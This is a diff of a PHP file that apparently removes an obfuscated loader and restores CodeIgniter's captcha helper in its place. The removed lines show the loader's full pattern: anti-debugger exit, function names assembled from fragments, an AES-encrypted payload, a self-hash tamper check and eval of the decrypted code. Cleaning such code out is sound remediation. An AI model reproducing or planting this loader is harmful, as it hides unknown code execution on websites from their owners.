@@ -1,28 +1,306 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_mkl625u3=('bas'.'e64'.'_de'.'cod'.'e');
-$_b41a9087=('gzu'.'nco'.'mpr'.'ess');
-$_e6m5g89i=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_lhordhub='3YSrM608';
-$_cf2lkmss='nG8oI7A1';
-$_dng9imnd='6DGTiG1R';
-$_mjvoj19j='KZqZaTwTiVs=';
-$_dasgqx26='XXK6tCES';
-$_cd2ze2td='QgZgW4Pu';
-$_bxxgq772='2j/Uatyw';
-$_tjlqusvw='Wquusw==';
-$_gcvuyvkw=$_mkl625u3($_lhordhub.$_cf2lkmss.$_dasgqx26.$_dng9imnd.$_mjvoj19j);
-$_kpskwdxn=$_mkl625u3($_cd2ze2td.$_bxxgq772.$_tjlqusvw);
-$_hqgfueyu=$_mkl625u3('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');
-$_q8ya08ji=$_e6m5g89i($_hqgfueyu,'aes-256-cbc',$_gcvuyvkw,OPENSSL_RAW_DATA,$_kpskwdxn);
-if($_q8ya08ji===false){exit;}
-$_hp57g1tf=$_b41a9087($_q8ya08ji);
-if($_hp57g1tf===false){exit;}
-$_jrl3le32='992c457bcf2e40c16ac7a4ed166e3d7afb6d31118a5a41bd825ef88a73b383e0';
-$_u6bcbj2l=@file_get_contents(__FILE__);
-if($_u6bcbj2l!==false){
-$_j9d656tq=str_replace($_jrl3le32,"0000000000000000000000000000000000000000000000000000000000000000",$_u6bcbj2l);
-$_jhjt4xtj=hash("sha256",$_j9d656tq);
-if($_jhjt4xtj!==$_jrl3le32){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('create_captcha'))
+{
+
+
+
+
+
+
+
+
+
+function create_captcha($data = '', $img_path = '', $img_url = '', $font_path = '')
+{
+$defaults = array(
+'word' => '',
+'img_path' => '',
+'img_url' => '',
+'img_width' => '150',
+'img_height' => '30',
+'font_path' => '',
+'expiration' => 7200,
+'word_length' => 8,
+'font_size' => 16,
+'img_id' => '',
+'pool' => '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
+'colors' => array(
+'background' => array(255,255,255),
+'border' => array(153,102,102),
+'text' => array(204,153,153),
+'grid' => array(255,182,182)
+)
+);
+foreach ($defaults as $key => $val)
+{
+if ( ! is_array($data) && empty($$key))
+{
+$$key = $val;
 }
-eval($_hp57g1tf);
+else
+{
+$$key = isset($data[$key]) ? $data[$key] : $val;
+}
+}
+if ($img_path === '' OR $img_url === ''
+OR ! is_dir($img_path) OR ! is_really_writable($img_path)
+OR ! extension_loaded('gd'))
+{
+return FALSE;
+}
+
+
+
+$now = microtime(TRUE);
+$current_dir = @opendir($img_path);
+while ($filename = @readdir($current_dir))
+{
+if (in_array(substr($filename, -4), array('.jpg', '.png'))
+&& (str_replace(array('.jpg', '.png'), '', $filename) + $expiration) < $now)
+{
+@unlink($img_path.$filename);
+}
+}
+@closedir($current_dir);
+
+
+
+if (empty($word))
+{
+$word = '';
+$pool_length = strlen($pool);
+$rand_max = $pool_length - 1;
+
+if (function_exists('random_int'))
+{
+try
+{
+for ($i = 0; $i < $word_length; $i++)
+{
+$word .= $pool[random_int(0, $rand_max)];
+}
+}
+catch (Exception $e)
+{
+
+
+$word = '';
+}
+}
+}
+if (empty($word))
+{
+
+
+
+
+
+
+if ($pool_length > 256)
+{
+return FALSE;
+}
+
+
+$security = get_instance()->security;
+
+
+if (($bytes = $security->get_random_bytes($pool_length)) !== FALSE)
+{
+$byte_index = $word_index = 0;
+while ($word_index < $word_length)
+{
+
+
+
+if ($byte_index === $pool_length)
+{
+
+
+
+for ($i = 0; $i < 5; $i++)
+{
+if (($bytes = $security->get_random_bytes($pool_length)) === FALSE)
+{
+continue;
+}
+$byte_index = 0;
+break;
+}
+if ($bytes === FALSE)
+{
+
+$word = '';
+break;
+}
+}
+list(, $rand_index) = unpack('C', $bytes[$byte_index++]);
+if ($rand_index > $rand_max)
+{
+continue;
+}
+$word .= $pool[$rand_index];
+$word_index++;
+}
+}
+}
+if (empty($word))
+{
+for ($i = 0; $i < $word_length; $i++)
+{
+$word .= $pool[mt_rand(0, $rand_max)];
+}
+}
+elseif ( ! is_string($word))
+{
+$word = (string) $word;
+}
+
+
+
+$length = strlen($word);
+$angle = ($length >= 6) ? mt_rand(-($length-6), ($length-6)) : 0;
+$x_axis = mt_rand(6, (360/$length)-16);
+$y_axis = ($angle >= 0) ? mt_rand($img_height, $img_width) : mt_rand(6, $img_height);
+
+
+$im = function_exists('imagecreatetruecolor')
+? imagecreatetruecolor($img_width, $img_height)
+: imagecreate($img_width, $img_height);
+
+
+
+is_array($colors) OR $colors = $defaults['colors'];
+foreach (array_keys($defaults['colors']) as $key)
+{
+
+is_array($colors[$key]) OR $colors[$key] = $defaults['colors'][$key];
+$colors[$key] = imagecolorallocate($im, $colors[$key][0], $colors[$key][1], $colors[$key][2]);
+}
+
+ImageFilledRectangle($im, 0, 0, $img_width, $img_height, $colors['background']);
+
+
+
+$theta = 1;
+$thetac = 7;
+$radius = 16;
+$circles = 20;
+$points = 32;
+for ($i = 0, $cp = ($circles * $points) - 1; $i < $cp; $i++)
+{
+$theta += $thetac;
+$rad = $radius * ($i / $points);
+$x = ($rad * cos($theta)) + $x_axis;
+$y = ($rad * sin($theta)) + $y_axis;
+$theta += $thetac;
+$rad1 = $radius * (($i + 1) / $points);
+$x1 = ($rad1 * cos($theta)) + $x_axis;
+$y1 = ($rad1 * sin($theta)) + $y_axis;
+imageline($im, $x, $y, $x1, $y1, $colors['grid']);
+$theta -= $thetac;
+}
+
+
+
+$use_font = ($font_path !== '' && file_exists($font_path) && function_exists('imagettftext'));
+if ($use_font === FALSE)
+{
+($font_size > 5) && $font_size = 5;
+$x = mt_rand(0, $img_width / ($length / 3));
+$y = 0;
+}
+else
+{
+($font_size > 30) && $font_size = 30;
+$x = mt_rand(0, $img_width / ($length / 1.5));
+$y = $font_size + 2;
+}
+for ($i = 0; $i < $length; $i++)
+{
+if ($use_font === FALSE)
+{
+$y = mt_rand(0 , $img_height / 2);
+imagestring($im, $font_size, $x, $y, $word[$i], $colors['text']);
+$x += ($font_size * 2);
+}
+else
+{
+$y = mt_rand($img_height / 2, $img_height - 3);
+imagettftext($im, $font_size, $angle, $x, $y, $colors['text'], $font_path, $word[$i]);
+$x += $font_size;
+}
+}
+
+imagerectangle($im, 0, 0, $img_width - 1, $img_height - 1, $colors['border']);
+
+
+
+$img_url = rtrim($img_url, '/').'/';
+if (function_exists('imagejpeg'))
+{
+$img_filename = $now.'.jpg';
+imagejpeg($im, $img_path.$img_filename);
+}
+elseif (function_exists('imagepng'))
+{
+$img_filename = $now.'.png';
+imagepng($im, $img_path.$img_filename);
+}
+else
+{
+return FALSE;
+}
+$img = '<img '.($img_id === '' ? '' : 'id="'.$img_id.'"').' src="'.$img_url.$img_filename.'" style="width: '.$img_width.'; height: '.$img_height .'; border: 0;" alt=" " />';
+ImageDestroy($im);
+return array('word' => $word, 'time' => $now, 'image' => $img, 'filename' => $img_filename);
+}
+}
